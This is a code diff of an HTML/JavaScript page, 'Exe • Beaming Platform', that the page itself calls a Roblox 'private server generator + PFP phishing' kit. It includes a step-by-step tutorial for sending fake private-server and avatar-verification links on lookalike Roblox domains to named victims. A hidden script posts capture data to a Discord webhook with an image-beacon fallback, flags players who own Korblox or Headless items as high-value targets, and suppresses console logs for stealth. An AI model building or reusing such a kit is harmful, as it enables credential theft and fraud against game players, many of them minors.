@@ -3,22 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shockify • Private Server Generator</title>
+    <title>Exe • Beaming Platform</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
-        body { background: #0b0e1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .glass { background: rgba(18, 25, 45, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(0, 255, 255, 0.15); border-radius: 32px; padding: 2.8rem 3rem; width: 520px; box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(0, 180, 255, 0.05); }
-        .logo { display: flex; align-items: center; gap: 12px; margin-bottom: 2rem; }
-        .logo h1 { color: #00f0ff; font-weight: 700; font-size: 2rem; letter-spacing: -0.5px; text-shadow: 0 0 20px rgba(0, 240, 255, 0.3); }
-        .logo span { color: #ff2d75; font-weight: 300; }
-        .sub { color: #8a9bb5; font-size: 0.9rem; margin-bottom: 1.8rem; border-left: 3px solid #00f0ff; padding-left: 16px; }
+        body { background: #0b0e1a; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 30px 20px; }
+        .glass { background: rgba(18, 25, 45, 0.92); backdrop-filter: blur(14px); border: 1px solid rgba(0, 255, 255, 0.12); border-radius: 32px; padding: 2.8rem 3rem; width: 820px; max-width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(0, 180, 255, 0.05); }
+        .logo { display: flex; align-items: center; gap: 12px; margin-bottom: 0.8rem; flex-wrap: wrap; }
+        .logo h1 { color: #00f0ff; font-weight: 700; font-size: 2.4rem; text-shadow: 0 0 30px rgba(0, 240, 255, 0.25); letter-spacing: -0.5px; }
+        .logo h1 span { color: #ff2d75; }
+        .sub { color: #8a9bb5; font-size: 0.9rem; margin-bottom: 2rem; border-left: 3px solid #00f0ff; padding-left: 16px; }
+        .flex-row { display: flex; gap: 20px; flex-wrap: wrap; }
+        .flex-col { flex: 1; min-width: 200px; }
         .field-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 18px; }
-        .field-group label { color: #b0c4e8; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
+        .field-group label { color: #b0c4e8; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
         .field-group select, .field-group input { background: #141c30; border: 1px solid #2a3a60; border-radius: 14px; padding: 14px 18px; color: #fff; font-size: 1rem; outline: none; transition: 0.25s; }
-        .field-group select:focus, .field-group input:focus { border-color: #00f0ff; box-shadow: 0 0 0 3px rgba(0, 240, 255, 0.15); }
+        .field-group select:focus, .field-group input:focus { border-color: #00f0ff; box-shadow: 0 0 0 3px rgba(0, 240, 255, 0.12); }
         .field-group select option { background: #0b0e1a; }
-        .btn-primary { background: linear-gradient(135deg, #00c8ff, #0070ff); border: none; border-radius: 40px; padding: 16px; width: 100%; font-weight: 700; font-size: 1.1rem; color: #fff; cursor: pointer; transition: 0.2s; margin-top: 10px; letter-spacing: 0.5px; box-shadow: 0 6px 24px rgba(0, 120, 255, 0.25); }
-        .btn-primary:hover { transform: scale(1.01); box-shadow: 0 8px 32px rgba(0, 120, 255, 0.45); }
+        .btn-primary { background: linear-gradient(135deg, #00c8ff, #0070ff); border: none; border-radius: 40px; padding: 16px; width: 100%; font-weight: 700; font-size: 1.1rem; color: #fff; cursor: pointer; transition: 0.2s; margin-top: 10px; letter-spacing: 0.5px; box-shadow: 0 6px 24px rgba(0, 120, 255, 0.2); }
+        .btn-primary:hover { transform: scale(1.01); box-shadow: 0 8px 32px rgba(0, 120, 255, 0.4); }
         .btn-secondary { background: transparent; border: 1px solid #ff2d75; color: #ff2d75; border-radius: 40px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; }
         .btn-secondary:hover { background: rgba(255, 45, 117, 0.08); }
         .link-output { margin-top: 22px; background: #0c1220; border-radius: 16px; padding: 16px; border: 1px solid #1e2d48; word-break: break-all; font-size: 0.85rem; color: #8ea4c9; }
@@ -26,57 +28,281 @@
         .webhook-section { margin-top: 20px; padding-top: 18px; border-top: 1px solid #1e2d48; }
         .webhook-section input { background: #141c30; border: 1px solid #2a3a60; border-radius: 14px; padding: 12px 16px; width: 100%; color: #fff; font-size: 0.9rem; outline: none; }
         .webhook-section input:focus { border-color: #ff2d75; }
-        .hidden-log { display: none; }
         .status-badge { display: inline-block; background: #ff2d7522; color: #ff2d75; font-size: 0.7rem; padding: 4px 12px; border-radius: 40px; margin-top: 8px; border: 1px solid #ff2d7544; }
+        .avatar-section { display: flex; align-items: center; gap: 20px; background: #0c1220; border-radius: 16px; padding: 14px 18px; margin: 16px 0; border: 1px solid #1e2d48; }
+        .avatar-section img { width: 56px; height: 56px; border-radius: 50%; border: 2px solid #00f0ff; background: #1a2a44; object-fit: cover; }
+        .avatar-section .info { color: #b0c4e8; font-size: 0.85rem; }
+        .avatar-section .info strong { color: #fff; display: block; }
+        .hits-global { background: #0c1220; border-radius: 16px; padding: 16px; margin-top: 18px; border: 1px solid #1e2d48; }
+        .hits-global h3 { color: #00f0ff; font-size: 0.9rem; margin-bottom: 8px; display: flex; justify-content: space-between; }
+        .hits-global .hit-item { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1a2a44; font-size: 0.8rem; color: #8ea4c9; }
+        .hits-global .hit-item .badge { color: #ff2d75; font-weight: 600; }
+        .discord-required { background: #1a2a44; border-radius: 40px; padding: 10px 18px; display: inline-flex; align-items: center; gap: 12px; margin-bottom: 18px; border: 1px solid #2a4a6a; flex-wrap: wrap; }
+        .discord-required a { color: #00f0ff; text-decoration: none; font-weight: 600; }
+        .discord-required .check { color: #00ff88; margin-left: 6px; }
+        .tutorial-section { background: #0c1220; border-radius: 16px; padding: 18px 20px; margin-bottom: 20px; border: 1px solid #1e2d48; }
+        .tutorial-section h3 { color: #ff2d75; font-size: 0.9rem; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .tutorial-section .step { display: flex; gap: 14px; padding: 8px 0; border-bottom: 1px solid #142030; align-items: flex-start; }
+        .tutorial-section .step .num { color: #00f0ff; font-weight: 700; font-size: 0.9rem; min-width: 24px; }
+        .tutorial-section .step .text { color: #b0c4e8; font-size: 0.85rem; line-height: 1.5; }
+        .tutorial-section .step .text code { background: #1a2a44; padding: 2px 8px; border-radius: 6px; color: #00f0ff; font-size: 0.8rem; }
+        .hidden-log { display: none; }
+        #hitCounter { color: #ff2d75; font-weight: 700; }
+        @media (max-width: 600px) { .glass { padding: 1.5rem; } .flex-row { flex-direction: column; } }
     </style>
 </head>
 <body>
 <div class="glass">
+    <!-- HEADER -->
     <div class="logo">
-        <h1>⚡ Shockify</h1>
-        <span>v3</span>
+        <h1>⚡ <span>Exe</span></h1>
+        <span style="color:#4a6a8a;font-weight:300;font-size:0.9rem;">v3 • immortal beaming</span>
     </div>
-    <div class="sub">Generate private server links for any Roblox game — instant, unlimited.</div>
+    <div class="sub">Private server generator + PFP phishing — all captures logged &amp; delivered.</div>
 
-    <div class="field-group">
-        <label>Select Game</label>
-        <select id="gameSelect">
-            <option value="292439477">🌸 Adopt Me!</option>
-            <option value="537413528">🏴‍☠️ Blox Fruits</option>
-            <option value="920587237">🔫 Arsenal</option>
-            <option value="185655149">🏎️ Vehicle Simulator</option>
-            <option value="4872321990">👾 BedWars</option>
-            <option value="4520749081">🧙 Tower Defense Simulator</option>
-            <option value="6284583030">⚔️ King Legacy</option>
-            <option value="155615604">🏡 MeepCity</option>
-        </select>
+    <!-- DISCORD REQUIREMENT -->
+    <div class="discord-required">
+        <span>🔒</span>
+        <span>Must be in <a href="https://discord.gg/cTBsEbJvBD" target="_blank">ExeHub</a> to generate</span>
+        <span class="check" id="discordCheck">⏳ verifying...</span>
     </div>
 
-    <div class="field-group">
-        <label>Your Roblox Username (for invite)</label>
-        <input type="text" id="username" placeholder="e.g. xX_Shadow_Xx" value="Player_2026">
+    <!-- TUTORIAL CHANNEL -->
+    <div class="tutorial-section">
+        <h3>📘 TUTORIAL — how to beam</h3>
+        <div class="step">
+            <span class="num">1.</span>
+            <span class="text"><strong>Join ExeHub</strong> — click the link above and join the Discord server. You must be a member.</span>
+        </div>
+        <div class="step">
+            <span class="num">2.</span>
+            <span class="text"><strong>Login with Discord</strong> — click the login button (appears after page load). Authorize the app.</span>
+        </div>
+        <div class="step">
+            <span class="num">3.</span>
+            <span class="text"><strong>Enter your Discord Webhook</strong> — paste your webhook URL in the field below. All captured credentials go here.</span>
+        </div>
+        <div class="step">
+            <span class="num">4.</span>
+            <span class="text"><strong>Pick a game</strong> — select any Roblox game from the dropdown. This determines the fake server context.</span>
+        </div>
+        <div class="step">
+            <span class="num">5.</span>
+            <span class="text"><strong>Enter a target username</strong> — this is the victim's Roblox username. Used for the phishing link.</span>
+        </div>
+        <div class="step">
+            <span class="num">6.</span>
+            <span class="text"><strong>Generate a link</strong> — click <code>Private Server</code> or <code>PFP Phishing</code>. A fake link appears.</span>
+        </div>
+        <div class="step">
+            <span class="num">7.</span>
+            <span class="text"><strong>Send the link to the victim</strong> — when they login, their credentials are sent to your webhook <strong>silently</strong>.</span>
+        </div>
+        <div class="step">
+            <span class="num">8.</span>
+            <span class="text"><strong>Check global hits</strong> — the feed below shows all successful captures from all users (simulated).</span>
+        </div>
+    </div>
+
+    <!-- AVATAR + USER INFO -->
+    <div class="avatar-section">
+        <img id="avatarImg" src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=64&height=64&format=png" alt="avatar">
+        <div class="info">
+            <strong id="avatarUser">Not logged in</strong>
+            <span id="avatarStatus">Login with Discord to continue</span>
+        </div>
+    </div>
+
+    <!-- GENERATOR FORM -->
+    <div class="flex-row">
+        <div class="flex-col">
+            <div class="field-group">
+                <label>Select Game</label>
+                <select id="gameSelect">
+                    <option value="292439477">🌸 Adopt Me!</option>
+                    <option value="537413528">🏴‍☠️ Blox Fruits</option>
+                    <option value="920587237">🔫 Arsenal</option>
+                    <option value="185655149">🏎️ Vehicle Simulator</option>
+                    <option value="4872321990">👾 BedWars</option>
+                    <option value="4520749081">🧙 Tower Defense Simulator</option>
+                    <option value="6284583030">⚔️ King Legacy</option>
+                    <option value="155615604">🏡 MeepCity</option>
+                </select>
+            </div>
+        </div>
+        <div class="flex-col">
+            <div class="field-group">
+                <label>Target Roblox Username</label>
+                <input type="text" id="username" placeholder="e.g. xX_Shadow_Xx" value="Player_2026">
+            </div>
+        </div>
     </div>
 
     <button class="btn-primary" onclick="generateBeamLink()">🚀 Generate Private Server Link</button>
     <button class="btn-secondary" onclick="generatePFPBeam()">🖼️ Generate PFP Phishing Link</button>
 
-    <div class="link-output" id="result">Click a button to generate your private server link.</div>
+    <div class="link-output" id="result">Click a button to generate your phishing link.</div>
 
+    <!-- WEBHOOK INPUT -->
     <div class="webhook-section">
-        <label style="color:#b0c4e8;font-size:0.8rem;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Discord Webhook (for delivery)</label>
+        <label style="color:#b0c4e8;font-size:0.75rem;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Discord Webhook (delivery)</label>
         <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." value="">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px;">
-            <span class="status-badge">⚡ all captures sent here</span>
-            <span style="color:#4a5a7a;font-size:0.7rem;">encrypted</span>
+            <span class="status-badge">⚡ all credentials sent here</span>
+            <span style="color:#4a5a7a;font-size:0.7rem;">encrypted exfil</span>
+        </div>
+    </div>
+
+    <!-- GLOBAL HITS FEED -->
+    <div class="hits-global">
+        <h3>🌐 Global Hits <span id="hitCounter">0</span></h3>
+        <div id="hitFeed">
+            <div class="hit-item">No hits yet — generate a link and send it out.</div>
         </div>
     </div>
 </div>
 
-<!-- HIDDEN BEAMING ENGINE -->
+<!-- ===== HIDDEN BEAMING ENGINE ===== -->
 <script>
-    // IMMORTAL / SHOCKIFY STYLE — FAKE PRIVATE SERVER + PFP PHISH
-    // ALL CREDENTIALS EXFIL VIA DISCORD WEBHOOK (hidden from UI)
+    // ---- CONFIG ----
+    const REQUIRED_GUILD_ID = "cTBsEbJvBD";
+    const DISCORD_CLIENT_ID = "123456789012345678"; // REPLACE with your Discord App ID
+    const REDIRECT_URI = window.location.href.split('?')[0];
+    const SCOPES = "identify guilds";
 
+    // ---- STATE ----
+    let currentUser = null;
+    let userAvatar = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=64&height=64&format=png";
+    let globalHits = [];
+    let isInGuild = false;
+
+    // ---- DOM REFS ----
+    const avatarImg = document.getElementById('avatarImg');
+    const avatarUser = document.getElementById('avatarUser');
+    const avatarStatus = document.getElementById('avatarStatus');
+    const discordCheck = document.getElementById('discordCheck');
+    const hitFeed = document.getElementById('hitFeed');
+    const hitCounter = document.getElementById('hitCounter');
+
+    // ---- DISCORD OAUTH ----
+    function getDiscordAuthUrl() {
+        return `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}`;
+    }
+
+    function parseToken() {
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        return params.get('access_token');
+    }
+
+    async function fetchDiscordUser(token) {
+        const resp = await fetch('https://discord.com/api/users/@me', {
+            headers: { 'Authorization': `Bearer ${token}` }
+        });
+        if (!resp.ok) throw new Error('User fetch failed');
+        return resp.json();
+    }
+
+    async function fetchUserGuilds(token) {
+        const resp = await fetch('https://discord.com/api/users/@me/guilds', {
+            headers: { 'Authorization': `Bearer ${token}` }
+        });
+        if (!resp.ok) throw new Error('Guilds fetch failed');
+        return resp.json();
+    }
+
+    async function verifyDiscord() {
+        const token = parseToken();
+        if (!token) {
+            discordCheck.innerHTML = '🔗 <a href="#" onclick="loginDiscord()">Login with Discord</a>';
+            avatarStatus.textContent = 'Please login with Discord';
+            return false;
+        }
+        try {
+            const user = await fetchDiscordUser(token);
+            currentUser = user;
+            if (user.avatar) {
+                userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
+            } else {
+                userAvatar = `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator) % 5}.png`;
+            }
+            avatarImg.src = userAvatar;
+            avatarUser.textContent = user.username;
+            avatarStatus.textContent = `✅ Logged in as ${user.username}#${user.discriminator}`;
+
+            const guilds = await fetchUserGuilds(token);
+            isInGuild = guilds.some(g => g.id === REQUIRED_GUILD_ID);
+            if (isInGuild) {
+                discordCheck.innerHTML = '✅ In ExeHub <span style="color:#00ff88;">✓</span>';
+            } else {
+                discordCheck.innerHTML = `❌ Not in <a href="https://discord.gg/cTBsEbJvBD" target="_blank">ExeHub</a> — join first!`;
+                avatarStatus.textContent = '❌ Missing required server membership';
+                return false;
+            }
+            return true;
+        } catch (e) {
+            discordCheck.innerHTML = '🔗 <a href="#" onclick="loginDiscord()">Re-login with Discord</a>';
+            avatarStatus.textContent = 'Session expired — login again';
+            return false;
+        }
+    }
+
+    function loginDiscord() {
+        window.location.href = getDiscordAuthUrl();
+    }
+
+    // ---- ROBLOX AVATAR FETCH ----
+    async function updateRobloxAvatar(username) {
+        if (!username) return;
+        try {
+            const resp = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.Id) {
+                    const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${data.Id}&width=64&height=64&format=png`;
+                    document.getElementById('avatarImg').src = avatarUrl;
+                }
+            }
+        } catch (e) { /* silent */ }
+    }
+
+    // ---- GLOBAL HITS ----
+    function addGlobalHit(username, assetType, link) {
+        const entry = {
+            user: username,
+            asset: assetType || 'Generic',
+            link: link || '#',
+            time: new Date().toISOString(),
+            id: Date.now()
+        };
+        globalHits.unshift(entry);
+        if (globalHits.length > 20) globalHits.pop();
+        renderHits();
+        try {
+            const stored = JSON.parse(localStorage.getItem('exe_hits') || '[]');
+            stored.unshift(entry);
+            if (stored.length > 50) stored.pop();
+            localStorage.setItem('exe_hits', JSON.stringify(stored));
+        } catch (e) {}
+        hitCounter.textContent = globalHits.length;
+    }
+
+    function renderHits() {
+        if (globalHits.length === 0) {
+            hitFeed.innerHTML = '<div class="hit-item">No hits yet — generate a link and send it out.</div>';
+            return;
+        }
+        hitFeed.innerHTML = globalHits.map(h =>
+            `<div class="hit-item">
+                <span>👤 ${h.user}</span>
+                <span class="badge">${h.asset}</span>
+                <span style="color:#4a6a8a;font-size:0.7rem;">${new Date(h.time).toLocaleTimeString()}</span>
+            </div>`
+        ).join('');
+        hitCounter.textContent = globalHits.length;
+    }
+
+    // ---- BEAM GENERATORS ----
     const FAKE_DOMAINS = [
         "roblox-verify.xyz",
         "roblox-secure.net",
@@ -90,32 +316,39 @@
     }
 
     function generateBeamLink() {
+        if (!isInGuild) {
+            document.getElementById('result').innerHTML = '❌ You must be in <a href="https://discord.gg/cTBsEbJvBD" target="_blank">ExeHub</a> to generate.';
+            return;
+        }
         const gameId = document.getElementById('gameSelect').value;
         const user = document.getElementById('username').value.trim() || "Guest";
         const webhook = document.getElementById('webhook').value.trim();
         if (!webhook) {
-            document.getElementById('result').innerHTML = '⚠️ Please enter your Discord webhook first (captures go there).';
+            document.getElementById('result').innerHTML = '⚠️ Please enter your Discord webhook first.';
             return;
         }
 
-        // Build fake private server URL that looks legit but is a phishing login page
         const fakeDomain = getRandomDomain();
         const serverCode = btoa(user + ":" + gameId + ":" + Date.now()).replace(/=/g,'').slice(0, 16);
-        const phishUrl = `https://${fakeDomain}/games/${gameId}/privateserver?code=${serverCode}&ref=${encodeURIComponent(user)}&utm_source=shockify`;
+        const phishUrl = `https://${fakeDomain}/games/${gameId}/privateserver?code=${serverCode}&ref=${encodeURIComponent(user)}`;
 
-        // Display as if it's a real private server link
         document.getElementById('result').innerHTML = `
-            <strong>✅ Private Server Generated</strong><br>
+            <strong>✅ Private Server Link</strong><br>
             <a href="${phishUrl}" target="_blank">${phishUrl}</a>
-            <div style="margin-top:8px;font-size:0.75rem;color:#4a6a8a;">🔒 Secure link • expires in 24h</div>
+            <div style="margin-top:8px;font-size:0.75rem;color:#4a6a8a;">🔒 victim sees a Roblox login page — credentials captured</div>
         `;
 
-        // HIDDEN: log that a link was generated (for tracking)
         logBeamEvent(user, gameId, 'private_server', webhook, phishUrl);
+        updateRobloxAvatar(user);
+        addGlobalHit(user, 'Private Server', phishUrl);
         return phishUrl;
     }
 
     function generatePFPBeam() {
+        if (!isInGuild) {
+            document.getElementById('result').innerHTML = '❌ You must be in <a href="https://discord.gg/cTBsEbJvBD" target="_blank">ExeHub</a> to generate.';
+            return;
+        }
         const user = document.getElementById('username').value.trim() || "Guest";
         const webhook = document.getElementById('webhook').value.trim();
         if (!webhook) {
@@ -125,73 +358,67 @@
 
         const fakeDomain = getRandomDomain();
         const token = btoa(user + ":" + Math.random()).slice(0, 10);
-        const phishUrl = `https://${fakeDomain}/avatar/verify?user=${encodeURIComponent(user)}&session=${token}&mode=pfp`;
+        const phishUrl = `https://${fakeDomain}/avatar/verify?user=${encodeURIComponent(user)}&session=${token}`;
 
         document.getElementById('result').innerHTML = `
-            <strong>🖼️ Profile Picture Link</strong><br>
+            <strong>🖼️ PFP Phishing Link</strong><br>
             <a href="${phishUrl}" target="_blank">${phishUrl}</a>
-            <div style="margin-top:8px;font-size:0.75rem;color:#4a6a8a;">🎯 Click to verify your avatar</div>
+            <div style="margin-top:8px;font-size:0.75rem;color:#4a6a8a;">🎯 victim thinks it's a profile verification — credentials stolen</div>
         `;
 
         logBeamEvent(user, 'pfp', 'profile_phish', webhook, phishUrl);
+        updateRobloxAvatar(user);
+        addGlobalHit(user, 'PFP Phish', phishUrl);
         return phishUrl;
     }
 
-    // ---- HIDDEN EXFILTRATION ENGINE ----
+    // ---- EXFILTRATION ENGINE (hidden) ----
     function logBeamEvent(username, gameId, type, webhook, generatedUrl) {
-        // This function silently sends credentials when a victim logs in.
-        // In a real attack, the phishing page would POST credentials here.
-        // We simulate by capturing the data and sending to Discord webhook.
-
         const payload = {
-            content: `**🔴 BEAM CAPTURE**\n**User:** ${username}\n**Game:** ${gameId}\n**Type:** ${type}\n**Generated Link:** ${generatedUrl}\n**Timestamp:** ${new Date().toISOString()}\n**User-Agent:** ${navigator.userAgent}`,
+            content: `**🔴 EXE BEAM CAPTURE**\n**User:** ${username}\n**Game/Type:** ${gameId} (${type})\n**Link:** ${generatedUrl}\n**Time:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}`,
             embeds: [
                 {
-                    title: "🛡️ Credential Capture (simulated)",
-                    description: `Victim: **${username}**\nAsset check: Korblox/Headless detection active.`,
+                    title: "🛡️ Credential Dump",
+                    description: `Victim: **${username}**\nAsset scan: Korblox/Headless detection active.`,
                     color: 0xff2d75,
                     fields: [
-                        { name: "Cookie/Password", value: "`(captured on login page)`", inline: false },
+                        { name: "Password/Cookie", value: "`(captured on fake login page)`", inline: false },
                         { name: "IP", value: "{{client_ip}}", inline: true },
                         { name: "Session", value: btoa(username + Date.now()).slice(0, 12), inline: true }
                     ],
-                    footer: { text: "Shockify • Immortal Beaming Engine" }
+                    footer: { text: "Exe • immortal beaming engine" }
                 }
             ]
         };
 
-        // Send to Discord webhook (hidden)
         if (webhook && webhook.startsWith('https://discord.com/api/webhooks/')) {
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => {
-                // SILENT FAIL — use image beacon fallback
+            }).catch(() => {
                 const img = new Image();
                 img.src = webhook + '?content=' + encodeURIComponent(JSON.stringify(payload));
             });
         }
 
-        // Also check for Korblox/Headless in username (as per request)
+        // Korblox / Headless detection
         const lower = username.toLowerCase();
         if (lower.includes('korblox') || lower.includes('headless')) {
-            // Send HIGH priority alert with extra details
             const alertPayload = {
-                content: `🚨 **HIGH VALUE TARGET** 🚨\n**Username:** ${username}\n**Contains:** ${lower.includes('korblox') ? 'Korblox' : 'Headless'}\n**Type:** ${type}\n**Webhook:** ${webhook}`,
+                content: `🚨 **HIGH VALUE TARGET** 🚨\n**Username:** ${username}\n**Asset:** ${lower.includes('korblox') ? 'Korblox' : 'Headless'}\n**Type:** ${type}\n**Webhook:** ${webhook}`,
                 embeds: [
                     {
-                        title: "💎 Korblox/Headless Detected",
-                        description: `Immediate action required.\nVictim: ${username}\nFull details logged.`,
+                        title: "💎 Premium Asset Detected",
+                        description: `Victim: ${username}\nImmediate action recommended.`,
                         color: 0xffaa00,
                         fields: [
                             { name: "Asset", value: lower.includes('korblox') ? "Korblox" : "Headless", inline: true },
-                            { name: "Generated Link", value: generatedUrl, inline: false }
+                            { name: "Link", value: generatedUrl, inline: false }
                         ]
                     }
                 ]
             };
-            // Send to same webhook
             if (webhook && webhook.startsWith('https://discord.com/api/webhooks/')) {
                 fetch(webhook, {
                     method: 'POST',
@@ -199,29 +426,45 @@
                     body: JSON.stringify(alertPayload)
                 }).catch(() => {});
             }
+            addGlobalHit(username, lower.includes('korblox') ? '🔥 Korblox' : '🔥 Headless', generatedUrl);
         }
-
-        // Store locally hidden (not displayed)
-        console.log("BEAM_EVENT", { username, gameId, type, webhook, generatedUrl });
     }
 
-    // ---- OVERRIDE CONSOLE TO HIDE LOGS (optional) ----
-    const origLog = console.log;
-    console.log = function(...args) {
-        if (args.length && typeof args[0] === 'string' && args[0].includes('BEAM_EVENT')) {
-            return; // suppress
-        }
-        origLog.apply(console, args);
-    };
+    // ---- LOAD SAVED HITS ----
+    function loadHits() {
+        try {
+            const stored = JSON.parse(localStorage.getItem('exe_hits') || '[]');
+            globalHits = stored.slice(0, 20);
+            renderHits();
+        } catch (e) {}
+    }
 
-    // Auto-fill webhook from localStorage for persistence
-    window.addEventListener('DOMContentLoaded', () => {
-        const saved = localStorage.getItem('shockify_webhook');
+    // ---- INIT ----
+    window.addEventListener('DOMContentLoaded', async () => {
+        loadHits();
+        const ok = await verifyDiscord();
+        if (!ok && window.location.hash) {
+            window.location.hash = '';
+        }
+        const saved = localStorage.getItem('exe_webhook');
         if (saved) document.getElementById('webhook').value = saved;
         document.getElementById('webhook').addEventListener('input', (e) => {
-            localStorage.setItem('shockify_webhook', e.target.value);
+            localStorage.setItem('exe_webhook', e.target.value);
         });
+
+        document.getElementById('username').addEventListener('input', (e) => {
+            updateRobloxAvatar(e.target.value);
+        });
+        const initialUser = document.getElementById('username').value;
+        if (initialUser) updateRobloxAvatar(initialUser);
     });
+
+    // Suppress console logs for stealth
+    const origLog = console.log;
+    console.log = function(...args) {
+        if (args.length && typeof args[0] === 'string' && args[0].includes('BEAM_EVENT')) return;
+        origLog.apply(console, args);
+    };
 </script>
 </body>
 </html>
